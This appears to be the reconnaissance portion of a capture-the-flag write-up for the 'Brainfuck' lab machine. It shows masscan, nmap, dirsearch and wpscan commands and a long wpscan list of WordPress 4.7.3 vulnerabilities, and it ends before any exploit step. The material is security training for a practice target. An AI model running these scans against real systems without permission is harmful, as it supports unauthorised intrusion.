* [Recon-Enumeration](#recon-enumeration)
* [Exploit](#exploit)
* [Privesc](#privesc)

## Recon-Enumeration  
sudo masscan -p1-65535 10.10.10.17 -e tun0 --rate=1000  
![alt text](./img/brainfuck01.PNG?raw=true)  

nmap -A -p 22,25,110,143,443 10.10.10.17  
![alt text](./img/brainfuck02.PNG?raw=true)  

dirsearch -u https://10.10.10.17/ -w ~/wordlists/big.txt -t 100 --full-url -e php,html,txt,sql,log,htm -f  
![alt text](./img/brainfuck03.PNG?raw=true)  

We add the URLs found with nnmap in /etc/hosts and try to access it in the browser with https://  
![alt text](./img/brainfuck04.PNG?raw=true)  

![alt text](./img/brainfuck05.PNG?raw=true)  

![alt text](./img/brainfuck06.PNG?raw=true)  

dirsearch -u https://brainfuck.htb/ -w ~/wordlists/big.txt -t 100 --full-url -f  
![alt text](./img/brainfuck10.PNG?raw=true)  

I have Wapplyzer who identified wordpress on brainfuck.htb website, so we can use WPSCAN. But we can see this same information in the URLs found with dirsearch:
> https://brainfuck.htb/readme.html  
> https://brainfuck.htb/wp-links-opml.php  
![alt text](./img/brainfuck07.PNG?raw=true)  

wpscan --url https://brainfuck.htb/ --enumerate vp,u --disable-tls-checks -t 50  
![alt text](./img/brainfuck44.PNG?raw=true)  
> [+] URL: https://brainfuck.htb/ [10.10.10.17]  
[+] Started: Sat May  1 20:15:53 2021  
 |   
Interesting Finding(s):  
 |   
[+] Headers  
 | Interesting Entry: Server: nginx/1.10.0 (Ubuntu)  
 | Found By: Headers (Passive Detection)  
 | Confidence: 100%  
 |   
[+] XML-RPC seems to be enabled: https://brainfuck.htb/xmlrpc.php  
 | Found By: Direct Access (Aggressive Detection)  
 | Confidence: 100%  
 | References:  
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API  
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/  
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/  
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/  
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/  
 |   
[+] WordPress readme found: https://brainfuck.htb/readme.html  
 | Found By: Direct Access (Aggressive Detection)  
 | Confidence: 100%  
 |   
[+] The external WP-Cron seems to be enabled: https://brainfuck.htb/wp-cron.php  
 | Found By: Direct Access (Aggressive Detection)  
 | Confidence: 60%  
 | References:  
 |  - https://www.iplocation.net/defend-wordpress-from-ddos  
 |  - https://github.com/wpscanteam/wpscan/issues/1299  
 |   
[+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).  
 | Found By: Rss Generator (Passive Detection)  
 |  - https://brainfuck.htb/?feed=rss2, <generator>https://wordpress.org/?v=4.7.3</generator>  
 |  - https://brainfuck.htb/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.7.3</generator>  
 |  
 | [!] 51 vulnerabilities identified:  
 |  
 | [!] Title: WordPress 2.3-4.8.3 - Host Header Injection in Password Reset  
 |     References:  
 |      - https://wpscan.com/vulnerability/b3f2f3db-75e4-4d48-ae5e-d4ff172bc093  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295  
 |      - https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html  
 |      - https://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html  
 |      - https://core.trac.wordpress.org/ticket/25239  
 |  
 | [!] Title: WordPress 2.7.0-4.7.4 - Insufficient Redirect Validation  
 |     Fixed in: 4.7.5  
 |     References:  
 |      - https://wpscan.com/vulnerability/e9e59e08-0586-4332-a394-efb648c7cd84  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9066  
 |      - https://github.com/WordPress/WordPress/commit/76d77e927bb4d0f87c7262a50e28d84e01fd2b11  
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/  
 |  
 | [!] Title: WordPress 2.5.0-4.7.4 - Post Meta Data Values Improper Handling in XML-RPC  
 |     Fixed in: 4.7.5  
 |     References:  
 |      - https://wpscan.com/vulnerability/973c55ed-e120-46a1-8dbb-538b54d03892  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9062  
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/  
 |      - https://github.com/WordPress/WordPress/commit/3d95e3ae816f4d7c638f40d3e936a4be19724381  
 |  
 | [!] Title: WordPress 3.4.0-4.7.4 - XML-RPC Post Meta Data Lack of Capability Checks   
 |     Fixed in: 4.7.5  
 |     References:  
 |      - https://wpscan.com/vulnerability/a5a4f4ca-19e5-4665-b501-5c75e0f56001  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9065  
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/  
 |      - https://github.com/WordPress/WordPress/commit/e88a48a066ab2200ce3091b131d43e2fab2460a4  
 |  
 | [!] Title: WordPress 2.5.0-4.7.4 - Filesystem Credentials Dialog CSRF  
 |     Fixed in: 4.7.5  
 |     References:  
 |      - https://wpscan.com/vulnerability/efe46d58-45e4-4cd6-94b3-1a639865ba5b  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9064  
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/  
 |      - https://github.com/WordPress/WordPress/commit/38347d7c580be4cdd8476e4bbc653d5c79ed9b67  
 |      - https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_connection_information.html  
 |  
 | [!] Title: WordPress 3.3-4.7.4 - Large File Upload Error XSS  
 |     Fixed in: 4.7.5  
 |     References:  
 |      - https://wpscan.com/vulnerability/78ae4791-2703-4fdd-89b2-76c674994acf  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9061  
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/  
 |      - https://github.com/WordPress/WordPress/commit/8c7ea71edbbffca5d9766b7bea7c7f3722ffafa6  
 |      - https://hackerone.com/reports/203515  
 |      - https://hackerone.com/reports/203515  
 |  
 | [!] Title: WordPress 3.4.0-4.7.4 - Customizer XSS & CSRF  
 |     Fixed in: 4.7.5  
 |     References:  
 |      - https://wpscan.com/vulnerability/e9535a5c-c6dc-4742-be40-1b94a718d3f3  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9063  
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/  
 |      - https://github.com/WordPress/WordPress/commit/3d10fef22d788f29aed745b0f5ff6f6baea69af3  
 |  
 | [!] Title: WordPress 2.3.0-4.8.1 - $wpdb->prepare() potential SQL Injection  
 |     Fixed in: 4.7.6  
 |     References:  
 |      - https://wpscan.com/vulnerability/9b3414c0-b33b-4c55-adff-718ff4c3195d  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14723  
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/  
 |      - https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48  
 |      - https://github.com/WordPress/WordPress/commit/fc930d3daed1c3acef010d04acc2c5de93cd18ec  
 |  
 | [!] Title: WordPress 2.3.0-4.7.4 - Authenticated SQL injection  
 |     Fixed in: 4.7.5  
 |     References:  
 |      - https://wpscan.com/vulnerability/95e87ae5-eb01-4e27-96d3-b1f013deff1c  
 |      - https://medium.com/websec/wordpress-sqli-bbb2afcc8e94  
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/  
 |      - https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48  
 |      - https://wpvulndb.com/vulnerabilities/8905  
 |  
 | [!] Title: WordPress 2.9.2-4.8.1 - Open Redirect  
 |     Fixed in: 4.7.6  
 |     References:  
 |      - https://wpscan.com/vulnerability/571beae9-d92d-4f9b-aa9f-7c94e33683a1  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14725  
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/  
 |      - https://core.trac.wordpress.org/changeset/41398  
 |  
 | [!] Title: WordPress 3.0-4.8.1 - Path Traversal in Unzipping  
 |     Fixed in: 4.7.6  
 |     References:  
 |      - https://wpscan.com/vulnerability/d74ee25a-d845-46b5-afa6-b0a917b7737a  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14719  
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/  
 |      - https://core.trac.wordpress.org/changeset/41457  
 |      - https://hackerone.com/reports/205481  
 |  
 | [!] Title: WordPress 4.4-4.8.1 - Path Traversal in Customizer   
 |     Fixed in: 4.7.6  
 |     References:  
 |      - https://wpscan.com/vulnerability/6ef4eb23-d5a9-44b3-8402-f4b7b1a91522  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14722  
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/  
 |      - https://core.trac.wordpress.org/changeset/41397  
 |  
 | [!] Title: WordPress 4.4-4.8.1 - Cross-Site Scripting (XSS) in oEmbed  
 |     Fixed in: 4.7.6  
 |     References:  
 |      - https://wpscan.com/vulnerability/d1bb1404-ebdc-4bfd-9cae-d728e53c66e2  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14724  
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/  
 |      - https://core.trac.wordpress.org/changeset/41448  
 |  
 | [!] Title: WordPress 4.2.3-4.8.1 - Authenticated Cross-Site Scripting (XSS) in Visual Editor  
 |     Fixed in: 4.7.6  
 |     References:  
 |      - https://wpscan.com/vulnerability/e525b3ed-866e-4c48-8715-19fc8be14939  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14726  
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/  
 |      - https://core.trac.wordpress.org/changeset/41395  
 |      - https://blog.sucuri.net/2017/09/stored-cross-site-scripting-vulnerability-in-wordpress-4-8-1.html  
 |  
 | [!] Title: WordPress <= 4.8.2 - $wpdb->prepare() Weakness  
 |     Fixed in: 4.7.7  
 |     References:  
 |      - https://wpscan.com/vulnerability/c161f0f0-6527-4ba4-a43d-36c644e250fc  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16510  
 |      - https://wordpress.org/news/2017/10/wordpress-4-8-3-security-release/  
 |      - https://github.com/WordPress/WordPress/commit/a2693fd8602e3263b5925b9d799ddd577202167d  
 |      - https://twitter.com/ircmaxell/status/923662170092638208  
 |      - https://blog.ircmaxell.com/2017/10/disclosure-wordpress-wpdb-sql-injection-technical.html  
 |  
 | [!] Title: WordPress 2.8.6-4.9 - Authenticated JavaScript File Upload  
 |     Fixed in: 4.7.8  
 |     References:  
 |      - https://wpscan.com/vulnerability/0d2323bd-aecd-4d58-ba4b-597a43034f57  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17092  
 |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/  
 |      - https://github.com/WordPress/WordPress/commit/67d03a98c2cae5f41843c897f206adde299b0509  
 |  
 | [!] Title: WordPress 1.5.0-4.9 - RSS and Atom Feed Escaping  
 |     Fixed in: 4.7.8  
 |     References:  
 |      - https://wpscan.com/vulnerability/1f71a775-e87e-47e9-9642-bf4bce99c332  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17094  
 |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/  
 |      - https://github.com/WordPress/WordPress/commit/f1de7e42df29395c3314bf85bff3d1f4f90541de  
 |  
 | [!] Title: WordPress 4.3.0-4.9 - HTML Language Attribute Escaping  
 |     Fixed in: 4.7.8  
 |     References:  
 |      - https://wpscan.com/vulnerability/a6281b30-c272-4d44-9420-2ebd3c8ff7da  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17093  
 |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/  
 |      - https://github.com/WordPress/WordPress/commit/3713ac5ebc90fb2011e98dfd691420f43da6c09a  
 |  
 | [!] Title: WordPress 3.7-4.9 - 'newbloguser' Key Weak Hashing  
 |     Fixed in: 4.7.8  
 |     References:  
 |      - https://wpscan.com/vulnerability/809f68d5-97aa-44e5-b181-cc7bdf5685c5  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17091  
 |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/  
 |      - https://github.com/WordPress/WordPress/commit/eaf1cfdc1fe0bdffabd8d879c591b864d833326c  
 |  
 | [!] Title: WordPress 3.7-4.9.1 - MediaElement Cross-Site Scripting (XSS)  
 |     Fixed in: 4.7.9  
 |     References:  
 |      - https://wpscan.com/vulnerability/6ac45244-9f09-4e9c-92f3-f339d450fe72  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5776  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9263  
 |      - https://github.com/WordPress/WordPress/commit/3fe9cb61ee71fcfadb5e002399296fcc1198d850  
 |      - https://wordpress.org/news/2018/01/wordpress-4-9-2-security-and-maintenance-release/  
 |      - https://core.trac.wordpress.org/ticket/42720  
 |  
 | [!] Title: WordPress <= 4.9.4 - Application Denial of Service (DoS) (unpatched)  
 |     References:  
 |      - https://wpscan.com/vulnerability/5e0c1ddd-fdd0-421b-bdbe-3eee6b75c919  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389  
 |      - https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html  
 |      - https://github.com/quitten/doser.py  
 |      - https://thehackernews.com/2018/02/wordpress-dos-exploit.html  
 |  
 | [!] Title: WordPress 3.7-4.9.4 - Remove localhost Default  
 |     Fixed in: 4.7.10  
 |     References:  
 |      - https://wpscan.com/vulnerability/835614a2-ad92-4027-b485-24b39038171d  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101  
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/  
 |      - https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216  
 |  
 | [!] Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login  
 |     Fixed in: 4.7.10  
 |     References:  
 |      - https://wpscan.com/vulnerability/01b587e0-0a86-47af-a088-6e5e350e8247  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100  
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/  
 |      - https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e  
 |  
 | [!] Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag  
 |     Fixed in: 4.7.10  
 |     References:  
 |      - https://wpscan.com/vulnerability/2b7c77c3-8dbc-4a2a-9ea3-9929c3373557  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102  
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/  
 |      - https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d  
 |  
 | [!] Title: WordPress <= 4.9.6 - Authenticated Arbitrary File Deletion  
 |     Fixed in: 4.7.11  
 |     References:  
 |      - https://wpscan.com/vulnerability/42ab2bd9-bbb1-4f25-a632-1811c5130bb4  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895  
 |      - https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/  
 |      - http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/  
 |      - https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd  
 |      - https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/  
 |      - https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/  
 |  
 | [!] Title: WordPress <= 5.0 - Authenticated File Delete  
 |     Fixed in: 4.7.12  
 |     References:  
 |      - https://wpscan.com/vulnerability/e3ef8976-11cb-4854-837f-786f43cbdf44  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147  
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/  
 |  
 | [!] Title: WordPress <= 5.0 - Authenticated Post Type Bypass  
 |     Fixed in: 4.7.12  
 |     References:  
 |      - https://wpscan.com/vulnerability/999dba5a-82fb-4717-89c3-6ed723cc7e45  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152  
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/  
 |      - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/  
 |  
 | [!] Title: WordPress <= 5.0 - PHP Object Injection via Meta Data  
 |     Fixed in: 4.7.12  
 |     References:  
 |      - https://wpscan.com/vulnerability/046ff6a0-90b2-4251-98fc-b7fba93f8334  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148  
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/  
 |  
 | [!] Title: WordPress <= 5.0 - Authenticated Cross-Site Scripting (XSS)  
 |     Fixed in: 4.7.12  
 |     References:  
 |      - https://wpscan.com/vulnerability/3182002e-d831-4412-a27d-a5e39bb44314  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153  
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/  
 |  
 | [!] Title: WordPress <= 5.0 - Cross-Site Scripting (XSS) that could affect plugins  
 |     Fixed in: 4.7.12  
 |     References:  
 |      - https://wpscan.com/vulnerability/7f7a0795-4dd7-417d-804e-54f12595d1e4  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150  
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/  
 |      - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460  
 |  
 | [!] Title: WordPress <= 5.0 - User Activation Screen Search Engine Indexing  
 |     Fixed in: 4.7.12  
 |     References:  
 |      - https://wpscan.com/vulnerability/65f1aec4-6d28-4396-88d7-66702b21c7a2  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151  
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/  
 |  
 | [!] Title: WordPress <= 5.0 - File Upload to XSS on Apache Web Servers  
 |     Fixed in: 4.7.12  
 |     References:  
 |      - https://wpscan.com/vulnerability/d741f5ae-52ca-417d-a2ca-acdfb7ca5808  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149  
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/  
 |      - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a  
 |  
 | [!] Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution  
 |     Fixed in: 5.0.1  
 |     References:  
 |      - https://wpscan.com/vulnerability/1a693e57-f99c-4df6-93dd-0cdc92fd0526  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8943  
 |      - https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/  
 |      - https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce  
 |  
 | [!] Title: WordPress 3.9-5.1 - Comment Cross-Site Scripting (XSS)  
 |     Fixed in: 4.7.13  
 |     References:  
 |      - https://wpscan.com/vulnerability/d150f43f-6030-4191-98b8-20ae05585936  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9787  
 |      - https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b  
 |      - https://wordpress.org/news/2019/03/wordpress-5-1-1-security-and-maintenance-release/  
 |      - https://blog.ripstech.com/2019/wordpress-csrf-to-rce/  
 |  
 | [!] Title: WordPress <= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation  
 |     Fixed in: 4.7.14  
 |     References:  
 |      - https://wpscan.com/vulnerability/4494a903-5a73-4cad-8c14-1e7b4da2be61  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222  
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/  
 |      - https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68  
 |      - https://hackerone.com/reports/339483  
 |  
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Customizer  
 |     Fixed in: 4.7.15  
 |     References:  
 |      - https://wpscan.com/vulnerability/d39a7b84-28b9-4916-a2fc-6192ceb6fa56  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17674  
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/  
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html  
 |  
 | [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts  
 |     Fixed in: 4.7.15  
 |     References:  
 |      - https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671  
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/  
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html  
 |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308  
 |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/  
 |  
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Style Tags  
 |     Fixed in: 4.7.15  
 |     References:  
 |      - https://wpscan.com/vulnerability/d005b1f8-749d-438a-8818-21fba45c6465  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17672  
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/  
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html  
 |  
 | [!] Title: WordPress <= 5.2.3 - JSON Request Cache Poisoning  
 |     Fixed in: 4.7.15  
 |     References:  
 |      - https://wpscan.com/vulnerability/7804d8ed-457a-407e-83a7-345d3bbe07b2  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17673  
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/  
 |      - https://github.com/WordPress/WordPress/commit/b224c251adfa16a5f84074a3c0886270c9df38de  
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html  
 |  
 | [!] Title: WordPress <= 5.2.3 - Server-Side Request Forgery (SSRF) in URL Validation   
 |     Fixed in: 4.7.15  
 |     References:  
 |      - https://wpscan.com/vulnerability/26a26de2-d598-405d-b00c-61f71cfacff6  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17669  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17670  
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/  
 |      - https://github.com/WordPress/WordPress/commit/9db44754b9e4044690a6c32fd74b9d5fe26b07b2  
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html  
 |  
 | [!] Title: WordPress <= 5.2.3 - Admin Referrer Validation  
 |     Fixed in: 4.7.15  
 |     References:  
 |      - https://wpscan.com/vulnerability/715c00e3-5302-44ad-b914-131c162c3f71  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17675  
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/  
 |      - https://github.com/WordPress/WordPress/commit/b183fd1cca0b44a92f0264823dd9f22d2fd8b8d0  
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html  
 |  
 | [!] Title: WordPress <= 5.3 - Authenticated Improper Access Controls in REST API  
 |     Fixed in: 4.7.16  
 |     References:  
 |      - https://wpscan.com/vulnerability/4a6de154-5fbd-4c80-acd3-8902ee431bd8  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20043  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16788  
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/  
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-g7rg-hchx-c2gw  
 |  
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Crafted Links  
 |     Fixed in: 4.7.16  
 |     References:  
 |      - https://wpscan.com/vulnerability/23553517-34e3-40a9-a406-f3ffbe9dd265  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16773  
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/  
 |      - https://hackerone.com/reports/509930  
 |      - https://github.com/WordPress/wordpress-develop/commit/1f7f3f1f59567e2504f0fbebd51ccf004b3ccb1d  
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xvg2-m2f4-83m7  
 |  
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Block Editor Content  
 |     Fixed in: 4.7.16  
 |     References:  
 |      - https://wpscan.com/vulnerability/be794159-4486-4ae1-a5cc-5c190e5ddf5f  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16781  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16780  
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/  
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pg4x-64rh-3c9v  
 |  
 | [!] Title: WordPress <= 5.3 - wp_kses_bad_protocol() Colon Bypass  
 |     Fixed in: 4.7.16  
 |     References:  
 |      - https://wpscan.com/vulnerability/8fac612b-95d2-477a-a7d6-e5ec0bb9ca52  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20041  
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/  
 |      - https://github.com/WordPress/wordpress-develop/commit/b1975463dd995da19bb40d3fa0786498717e3c53  
 |  
 | [!] Title: WordPress < 5.4.1 - Password Reset Tokens Failed to Be Properly Invalidated  
 |     Fixed in: 4.7.17  
 |     References:  
 |      - https://wpscan.com/vulnerability/7db191c0-d112-4f08-a419-a1cd81928c4e  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11027  
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/  
 |      - https://core.trac.wordpress.org/changeset/47634/  
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/  
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ww7v-jg8c-q6jw  
 |  
 | [!] Title: WordPress < 5.4.1 - Unauthenticated Users View Private Posts  
 |     Fixed in: 4.7.17  
 |     References:  
 |      - https://wpscan.com/vulnerability/d1e1ba25-98c9-4ae7-8027-9632fb825a56  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11028  
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/  
 |      - https://core.trac.wordpress.org/changeset/47635/  
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/  
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xhx9-759f-6p2w  
 |  
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in Customizer  
 |     Fixed in: 4.7.17  
 |     References:  
 |      - https://wpscan.com/vulnerability/4eee26bd-a27e-4509-a3a5-8019dd48e429  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11025  
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/  
 |      - https://core.trac.wordpress.org/changeset/47633/  
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/  
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-4mhg-j6fx-5g3c  
 |  
 | [!] Title: WordPress < 5.4.1 - Cross-Site Scripting (XSS) in wp-object-cache  
 |     Fixed in: 4.7.17  
 |     References:  
 |      - https://wpscan.com/vulnerability/e721d8b9-a38f-44ac-8520-b4a9ed6a5157  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11029  
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/  
 |      - https://core.trac.wordpress.org/changeset/47637/  
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/  
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-568w-8m88-8g2c  
 |  
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in File Uploads  
 |     Fixed in: 4.7.17  
 |     References:  
 |      - https://wpscan.com/vulnerability/55438b63-5fc9-4812-afc4-2f1eff800d5f  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11026  
